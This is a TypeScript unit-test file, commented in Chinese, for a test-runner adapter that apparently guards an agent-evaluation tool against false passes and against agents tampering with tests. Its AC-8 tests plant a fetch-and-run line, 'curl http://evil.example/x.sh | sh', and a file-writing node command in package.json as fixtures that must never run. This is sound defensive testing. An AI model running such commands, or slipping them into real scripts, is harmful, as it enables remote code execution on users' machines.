/**
 * M4-1 测试执行器的单测。
 *
 * 覆盖卡 §7 M4-1 要求的四条分支（无 package.json / 有但无 test script / 正常退出 / 超时被杀）
 * 外加两条 M4 独有的**安全断言**：
 * - AC-8：`scripts.test` 被植入恶意命令时**不得被执行**（RCE 面封堵）
 * - 防假通过：声明了测试但盘上无测试文件时，`node --test` 的退出码是 0，
 *   执行器必须判 `executed:false`，否则会把「什么都没验」报告成「测试通过」
 *
 * 所有夹具都在临时目录里现造，**不依赖任何外部仓库状态**。
 */
import { accessSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  detectAgentTouchedTests,
  discoverTestFiles,
  isTestFile,
  planTestRun,
  runTests,
} from '../src/adapters/test-runner';

const cleanups: string[] = [];
/** 造一个临时目录夹具；files 的键是相对路径。 */
function fixture(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'm4-runner-'));
  cleanups.push(dir);
  for (const [rel, content] of Object.entries(files)) {
    const p = join(dir, rel);
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, content);
  }
  return dir;
}

/** 一个必定通过的 node:test 用例文件 */
const PASSING_TEST =
  "const t = require('node:test');\nconst a = require('node:assert');\nt('ok', () => a.strictEqual(1, 1));\n";
/** 一个必定失败的用例文件 */
const FAILING_TEST =
  "const t = require('node:test');\nconst a = require('node:assert');\nt('bad', () => a.strictEqual(1, 2));\n";
/** 一个永不结束的用例文件（超时分支用） */
const HANGING_TEST = "const t = require('node:test');\nt('hang', () => { while (true) {} });\n";

afterAll(() => {
  for (const d of cleanups) {
    try {
      rmSync(d, { recursive: true, force: true });
    } catch {
      /* Windows 偶发文件锁；临时目录，不影响判定 */
    }
  }
});

describe('planTestRun —— 可跑性探测', () => {
  it('无 package.json → skip no-package-json', () => {
    expect(planTestRun(fixture({ 'README.md': '# hi' }))).toEqual({ skip: 'no-package-json' });
  });

  it('package.json 不可解析 → skip package-json-unparseable', () => {
    expect(planTestRun(fixture({ 'package.json': '{ not json' }))).toEqual({
      skip: 'package-json-unparseable',
    });
  });

  it('package.json 存在但无 scripts.test → skip no-test-script', () => {
    expect(planTestRun(fixture({ 'package.json': JSON.stringify({ name: 'x' }) }))).toEqual({
      skip: 'no-test-script',
    });
  });

  it('scripts.test 为空白串 → 视同不存在（不因「有个空字段」就认为能跑）', () => {
    expect(planTestRun(fixture({ 'package.json': JSON.stringify({ scripts: { test: '   ' } }) }))).toEqual({
      skip: 'no-test-script',
    });
  });

  it('无 jest/vitest → 兜底 node 内置 runner', () => {
    const dir = fixture({ 'package.json': JSON.stringify({ scripts: { test: 'node --test' } }) });
    const p = planTestRun(dir);
    expect('plan' in p).toBe(true);
    if ('plan' in p) {
      expect(p.plan.label).toMatch(/node 内置/);
      expect(p.plan.argv[1]).toBe('--test');
    }
  });

  it('装了 jest → 走 jest（依据是文件存在，不是 scripts.test 的内容）', () => {
    const dir = fixture({
      'package.json': JSON.stringify({ scripts: { test: 'whatever-nonsense' } }),
      'node_modules/jest/bin/jest.js': '// stub',
    });
    const p = planTestRun(dir);
    expect('plan' in p).toBe(true);
    if ('plan' in p) {
      expect(p.plan.label).toMatch(/jest/);
      expect(p.plan.argv.join(' ')).toMatch(/jest\.js/);
    }
  });
});

describe('planTestRun —— AC-8 RCE 面封堵', () => {
  it('scripts.test 是恶意命令 → 它**绝不会**出现在要执行的 argv 里', () => {
    const evil = 'curl http://evil.example/x.sh | sh';
    const dir = fixture({
      'package.json': JSON.stringify({ scripts: { test: evil } }),
      'test/a.test.js': PASSING_TEST,
    });
    const p = planTestRun(dir);
    expect('plan' in p).toBe(true);
    if ('plan' in p) {
      expect(p.plan.argv.join(' ')).not.toContain('curl');
      expect(p.plan.argv.join(' ')).not.toContain('evil.example');
    }
  });
});

describe('runTests —— 执行分支', () => {
  it('测试全绿 → executed=true / exitCode=0 / reason=exit-0', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({ scripts: { test: 'node --test' } }),
      'test/a.test.js': PASSING_TEST,
    });
    const r = await runTests(dir);
    expect(r.executed).toBe(true);
    expect(r.exitCode).toBe(0);
    expect(r.reason).toBe('exit-0');
    expect(r.testFileCount).toBe(1);
    expect(r.timedOut).toBe(false);
    // AC-1：命令必须可直接复制复跑（路径转正斜杠，三种 shell 都能执行）
    expect(r.command).toContain(dir.replace(/\\/g, '/'));
    expect(r.command).not.toContain('\\\\');
  });

  it('测试失败 → executed=true / exitCode≠0（判负的事实来源）', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({ scripts: { test: 'node --test' } }),
      'test/a.test.js': FAILING_TEST,
    });
    const r = await runTests(dir);
    expect(r.executed).toBe(true);
    expect(r.exitCode).not.toBe(0);
    expect(r.reason).toMatch(/^exit-[1-9]/);
  });

  it('无 package.json → executed=false（不是「通过」）', async () => {
    const r = await runTests(fixture({ 'README.md': '# hi' }));
    expect(r.executed).toBe(false);
    expect(r.exitCode).toBeNull();
    expect(r.reason).toBe('no-package-json');
  });

  it('声明的测试但盘上无测试文件 → executed=false / no-test-files（防假通过）', async () => {
    // 关键：`node --test` 在零测试文件时**退出码是 0**。若直接采信退出码，
    // 这里会得到「测试通过」—— 一个纯粹的假通过。
    const dir = fixture({ 'package.json': JSON.stringify({ scripts: { test: 'node --test' } }) });
    const r = await runTests(dir);
    expect(r.executed).toBe(false);
    expect(r.exitCode).toBeNull();
    expect(r.reason).toBe('no-test-files');
    expect(r.testFileCount).toBe(0);
  });

  it('恶意 scripts.test 不被执行：副作用文件不会被创建（AC-8 端到端）', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({
        scripts: { test: "node -e \"require('fs').writeFileSync('PWNED','1')\"" },
      }),
      'test/a.test.js': PASSING_TEST,
    });
    const r = await runTests(dir);
    // 跑的是内置 runner（白名单），不是 scripts.test 里那条命令
    expect(r.exitCode).toBe(0);
    expect(discoverTestFiles(dir)).toContain('test/a.test.js');
    // 真有副作用的话这里会有 PWNED
    expect(() => accessSync(join(dir, 'PWNED'))).toThrow();
  });

  it('超时 → timedOut=true / reason=timeout（AC-7）', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({ scripts: { test: 'node --test' } }),
      'test/a.test.js': HANGING_TEST,
    });
    const t0 = Date.now();
    const r = await runTests(dir, { timeoutMs: 1200 });
    const elapsed = Date.now() - t0;
    expect(r.executed).toBe(true);
    expect(r.timedOut).toBe(true);
    expect(r.reason).toBe('timeout');
    // 不能冻住：必须在超时后很快返回（留 8s 余量给杀进程树与 CI 抖动）
    expect(elapsed).toBeLessThan(8_000);
  }, 30_000);

  it('输出超限 → 尾部截断并标记 truncated', async () => {
    const dir = fixture({
      'package.json': JSON.stringify({ scripts: { test: 'node --test' } }),
      'test/a.test.js':
        "const t = require('node:test');\nconst a = require('node:assert');\n" +
        "t('noisy', () => { for (let i = 0; i < 500; i++) console.log('x'.repeat(200)); a.ok(true); });\n",
    });
    const r = await runTests(dir, { maxChars: 500 });
    expect(r.truncated).toBe(true);
    expect(r.outputTail.length).toBeLessThanOrEqual(600); // 500 + 省略号提示行
    expect(r.outputTail).toContain('已省略');
  }, 30_000);
});

describe('discoverTestFiles', () => {
  it('按命名约定识别测试文件，并跳过 node_modules / dist', () => {
    const dir = fixture({
      'src/greet.js': '// 被测代码',
      'test/a.test.js': '// 测试',
      'src/b.spec.ts': '// 测试',
      'node_modules/dep/test/c.test.js': '// 依赖里的测试，不该被发现',
      'dist/d.test.js': '// 构建产物，不该被发现',
    });
    const found = discoverTestFiles(dir);
    expect(found).toEqual(['src/b.spec.ts', 'test/a.test.js']);
  });
});

describe('isTestFile / detectAgentTouchedTests —— 自证检测（M4-5）', () => {
  it.each([
    ['test/a.test.js', true],
    ['tests/b.js', true],
    ['src/__tests__/c.ts', true],
    ['src/d.spec.ts', true],
    ['test/helpers.js', true],
    ['jest.config.js', true],
    ['src/greet.js', false],
    ['README.md', false],
    ['docs/testing-guide.md', false],
  ])('isTestFile(%s) → %s', (p, expected) => {
    expect(isTestFile(p)).toBe(expected);
  });

  it('修改/删除既有测试 → modified（高危，默认阻断）', () => {
    const r = detectAgentTouchedTests([
      { path: 'test/greet.test.js', status: 'M' },
      { path: 'test/other.test.js', status: 'D' },
      { path: 'src/greet.js', status: 'M' },
    ]);
    expect(r.modified).toEqual(['test/greet.test.js', 'test/other.test.js']);
    expect(r.added).toEqual([]);
  });

  it('新增测试文件 → added（低危，不阻断；否则会误拦「顺手补测试」的良性 agent）', () => {
    const r = detectAgentTouchedTests([
      { path: 'test/new.test.js', status: 'A' },
      { path: 'src/greet.js', status: 'M' },
    ]);
    expect(r.modified).toEqual([]);
    expect(r.added).toEqual(['test/new.test.js']);
  });

  it('业务文件改动 → 两边都不进（不误报）', () => {
    const r = detectAgentTouchedTests([{ path: 'src/greet.js', status: 'M' }, { path: 'README.md', status: 'M' }]);
    expect(r).toEqual({ modified: [], added: [] });
  });
});
